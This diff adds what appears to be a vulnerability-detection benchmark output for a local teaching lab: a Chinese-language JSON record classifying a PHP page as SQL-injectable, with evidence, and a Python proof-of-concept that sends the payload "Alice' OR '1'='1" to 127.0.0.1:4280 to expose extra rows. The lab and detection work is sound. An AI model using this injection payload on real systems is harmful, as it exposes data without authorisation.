@@ -1,0 +1,81 @@
+```json
+{
+  "sample_id": "S001",
+  "prediction": "vulnerable",
+  "vulnerability_type": "SQL注入",
+  "locations": [
+    "F01:0007",
+    "F01:0010",
+    "F01:0011"
+  ],
+  "evidence": {
+    "source": "F01:0007 直接读取外部 GET 参数 name：$_GET['name'] ?? ''。",
+    "flow": "F01:0007 的 name 在 F01:0010 被字符串拼接进 SQL 的 WHERE name = '...' 条件。",
+    "guard": "无效：F01:0010 使用字符串拼接，未见预处理绑定、mysqli_real_escape_string、类型校验或白名单；name 作为值输入仍可改变 SQL 结构。",
+    "sink": "F01:0011 调用 $db->query($sql) 执行拼接后的 SQL，且无需登录即可通过 GET 到达。"
+  },
+  "prerequisites": [
+    "本地 PHP + MariaDB 教学入口 http://127.0.0.1:4280/lab_cases/S001/index.php 可访问。",
+    "lab_people 表已初始化，并预置 1 Alice、2 Bob、3 Carol。",
+    "common/db_connect.php 提供已连接的 mysqli 变量 $db，当前页面无需登录。",
+    "验证仅发送 GET 请求，不修改数据库数据。"
+  ],
+  "missing_context": [],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "将脚本保存为 poc_s001.py 后在本地运行：python3 poc_s001.py。脚本只访问 127.0.0.1:4280，先请求普通输入 name=Alice，再请求测试输入 name=Alice' OR '1'='1。实际观察应以页面记录变化为准：普通输入预期只出现 ID 1：Alice；测试输入预期出现 ID 1：Alice、ID 2：Bob、ID 3：Carol 等更多记录。成功条件是测试响应包含普通响应中不存在的 Bob/Carol 记录，而不是 HTTP 200。若失败，请检查教学服务是否启动、入口路径是否正确、lab_people 预置数据是否存在、$db 连接是否正常，以及 PHP 错误日志中是否有 S001 query failed 记录。"
+}
+```
+
+```python
+import sys
+import urllib.parse
+import urllib.request
+
+BASE = "http://127.0.0.1:4280/lab_cases/S001/index.php"
+
+def fetch(name):
+    query = urllib.parse.urlencode({"name": name})
+    url = f"{BASE}?{query}"
+    with urllib.request.urlopen(url, timeout=5) as resp:
+        body = resp.read().decode("utf-8", "replace")
+        return resp.status, body
+
+def marker(person_id, name):
+    return f"ID {person_id}：{name}"
+
+def main():
+    ordinary_status, ordinary_body = fetch("Alice")
+    payload = "Alice' OR '1'='1"
+    test_status, test_body = fetch(payload)
+
+    ordinary_alice = marker(1, "Alice") in ordinary_body
+    ordinary_bob = marker(2, "Bob") in ordinary_body
+    ordinary_carol = marker(3, "Carol") in ordinary_body
+
+    test_alice = marker(1, "Alice") in test_body
+    test_bob = marker(2, "Bob") in test_body
+    test_carol = marker(3, "Carol") in test_body
+
+    print(f"普通输入 status={ordinary_status}")
+    print(f"普通输入 Alice={ordinary_alice}, Bob={ordinary_bob}, Carol={ordinary_carol}")
+    print(f"测试输入 status={test_status}")
+    print(f"测试输入 Alice={test_alice}, Bob={test_bob}, Carol={test_carol}")
+
+    ordinary_ok = ordinary_alice and not ordinary_bob and not ordinary_carol
+    test_changed = test_alice and test_bob and test_carol
+
+    if ordinary_ok and test_changed:
+        print("观察结果：普通输入仅显示 Alice；测试输入显示 Alice、Bob、Carol，符合拼接注入导致的查询条件变化。")
+        return 0
+
+    print("未达到预期观察结果。请检查：")
+    print("1. http://127.0.0.1:4280/lab_cases/S001/index.php 是否可访问；")
+    print("2. lab_people 是否预置 1 Alice、2 Bob、3 Carol；")
+    print("3. common/db_connect.php 的 $db 是否连接正常；")
+    print("4. PHP 错误日志中是否有 S001 query failed 记录。")
+    return 1
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
